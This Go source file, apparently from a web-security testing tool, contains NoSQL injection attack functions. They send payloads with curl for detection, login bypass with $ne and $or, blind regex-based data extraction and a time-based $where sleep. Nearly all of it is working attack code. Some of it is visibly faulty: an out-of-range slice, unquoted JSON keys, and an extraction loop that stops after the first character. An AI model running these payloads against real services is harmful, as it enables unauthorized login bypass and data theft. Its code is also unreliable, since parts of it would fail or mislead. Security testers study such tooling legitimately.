package websecurity

import (
	"fmt"
	"strings"
)

func NoSQLDetect(endpoint, param string) (string, error) {
	payloads := []string{
		fmt.Sprintf(`{%s:{"$ne":""}}`, param),
		fmt.Sprintf(`{%s:{"$gt":""}}`, param),
		fmt.Sprintf(`{%s:{"$regex":".*"}}`, param),
	}
	var results []string
	for _, p := range payloads {
		cmd := throttledExec("curl", "-s", "-X", "POST", "-H", "Content-Type: application/json", "-d", p, endpoint)
		out, err := cmd.CombinedOutput()
		if err != nil {
			continue
		}
		results = append(results, fmt.Sprintf("%s: %d", p[:30], len(out)))
	}
	return fmt.Sprintf("NoSQL injection detection on %s: %s", endpoint, strings.Join(results, " | ")), nil
}

func NoSQLAuthBypass(endpoint, username, password string) (string, error) {
	payload := fmt.Sprintf(`{"user":"%s","pass":{"$ne":""},"username":{"$ne":""},"password":{"$gt":""}}`, username)
	if password != "" {
		payload = fmt.Sprintf(`{"$or":[{"user":"%s","pass":"%s"},{"user":{"$ne":""},"pass":{"$ne":""}}]}`, username, password)
	}
	cmd := throttledExec("curl", "-s", "-X", "POST", "-H", "Content-Type: application/json", "-d", payload, endpoint)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("NoSQL auth bypass failed: %w: %s", err, string(out))
	}
	bypassed := strings.Contains(string(out), "200") || strings.Contains(string(out), "success") || strings.Contains(string(out), "token")
	return fmt.Sprintf("NoSQL auth bypass on %s: bypassed=%v response_len=%d", endpoint, bypassed, len(out)), nil
}

func NoSQLExtract(endpoint, param, field string) (string, error) {
	var results []string
	for _, ch := range "abcdefghijklmnopqrstuvwxyz0123456789" {
		payload := fmt.Sprintf(`{%s:{"$regex":"^%s"}}`, param, string(ch))
		cmd := throttledExec("curl", "-s", "-X", "POST", "-H", "Content-Type: application/json", "-d", payload, endpoint)
		out, err := cmd.CombinedOutput()
		if err != nil {
			continue
		}
		if len(out) > 10 {
			results = append(results, fmt.Sprintf("char %s: %d", string(ch), len(out)))
		}
	}
	return fmt.Sprintf("NoSQL data extraction on %s field %s: %s", endpoint, field, strings.Join(results, " | ")), nil
}

func NoSQLTimeBased(endpoint, param string) (string, error) {
	payload := fmt.Sprintf(`{%s:{"$where":"sleep(5000)"}}`, param)
	cmd := throttledExec("curl", "-s", "--max-time", "10", "-X", "POST", "-H", "Content-Type: application/json", "-d", payload, endpoint)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("NoSQL time-based injection failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("NoSQL time-based injection on %s via %s: response_len=%d", endpoint, param, len(out)), nil
}
